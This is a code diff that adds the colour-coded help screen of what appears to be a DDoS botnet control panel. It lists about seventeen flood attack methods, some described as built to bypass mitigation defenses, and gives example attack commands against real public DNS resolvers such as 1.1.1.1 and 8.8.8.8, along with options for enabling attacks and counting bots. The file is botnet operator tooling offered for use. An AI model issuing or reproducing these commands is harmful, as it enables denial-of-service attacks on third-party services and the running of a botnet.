@@ -1,0 +1,26 @@
+\x1b[0m\x1b[37mAttack vectors\x1b[0m\x1b[92m:\x1b[37m
+ \x1b[92m- \x1b[92m!\x1b[37mudpplain\x1b[0m\x1b[92m: \x1b[0mUDP socket flood
+ \x1b[92m- \x1b[92m!\x1b[37mack\x1b[0m\x1b[92m: \x1b[0mTCP ACK flood
+ \x1b[92m- \x1b[92m!\x1b[37msyn\x1b[0m\x1b[92m: \x1b[0mTCP SYN flood
+ \x1b[92m- \x1b[92m!\x1b[37mwra\x1b[0m\x1b[92m: \x1b[0mTCP WRA flood
+ \x1b[92m- \x1b[92m!\x1b[37mstomp\x1b[0m\x1b[92m: \x1b[0mTCP handshake + ACK/PSH flood
+ \x1b[92m- \x1b[92m!\x1b[37mgreip\x1b[0m\x1b[92m: \x1b[0mLayer 3 GRE IP flood
+ \x1b[92m- \x1b[92m!\x1b[37mhandshake\x1b[0m\x1b[92m: \x1b[0mTCP 3-way handshake
+ \x1b[92m- \x1b[92m!\x1b[37mtcpbypass\x1b[0m\x1b[92m: \x1b[0mSimple TCP flood to bypass mitigation devices
+ \x1b[92m- \x1b[92m!\x1b[37mraknet\x1b[0m\x1b[92m: \x1b[0mFlood method utilizing RakNet protocol
+ \x1b[92m- \x1b[92m!\x1b[37msyndata\x1b[0m\x1b[92m: \x1b[0msyn flood with valid data
+ \x1b[92m- \x1b[92m!\x1b[37mopenvpn\x1b[0m\x1b[92m: \x1b[0mOpenVPN rst flood
+ \x1b[92m- \x1b[92m!\x1b[37mudpbypass\x1b[0m\x1b[92m: \x1b[0mUDP flood method designed to bypass defenses
+ \x1b[92m- \x1b[92m!\x1b[37msockethold\x1b[0m\x1b[92m: \x1b[0mSocket cpu attack
+ \x1b[92m- \x1b[92m!\x1b[37msocket\x1b[0m\x1b[92m: \x1b[0mSocket cps attack
+ \x1b[92m- \x1b[92m!\x1b[37mudpraw\x1b[0m\x1b[92m: \x1b[0mRaw UDP flood
+ \x1b[92m- \x1b[92m!\x1b[37mstd\x1b[0m\x1b[92m: \x1b[0mStandard socket flood
+ \x1b[92m- \x1b[92m!\x1b[37mgudp\x1b[0m\x1b[92m: \x1b[0mHigh gbps attack
+
+\x1b[0m\x1b[37mExamples\x1b[0m\x1b[92m:\x1b[37m
+ \x1b[92m- \x1b[92m\x1b[92m!\x1b[37mudpplain\x1b[0m\x1b[92m 1.1.1.1 15 \x1b[37mdport\x1b[92m=\x1b[37m53 len\x1b[92m=\x1b[37m1400
+ \x1b[92m- \x1b[92m!\x1b[37mudpplain\x1b[0m\x1b[92m 8.8.8.8 30 \x1b[37mminlen\x1b[92m=\x1b[37m700 \x1b[37mmaxlen\x1b[92m=\x1b[37m900
+ \x1b[92m- \x1b[92m!\x1b[37msocket\x1b[0m\x1b[92m 1.1.1.1 15 \x1b[37mdport\x1b[92m=\x1b[37m80 \x1b[37mpayload=\x1b[92m[\x1b[37mhexadecimal payload\x1b[92m]\x1b[37m
+
+\x1b[37mattacks \x1b[92m<\x1b[37menable/disable\x1b[92m> \x1b[92m: <<colors->$Reset>>Enable or disable the use of attacks
+\x1b[37mbotcount \x1b[92m<\x1b[37m-i/-a\x1b[92m> \x1b[92m<\x1b[37mfind\x1b[92m> : <<colors->$Reset>>Enable or disable the use of attacks
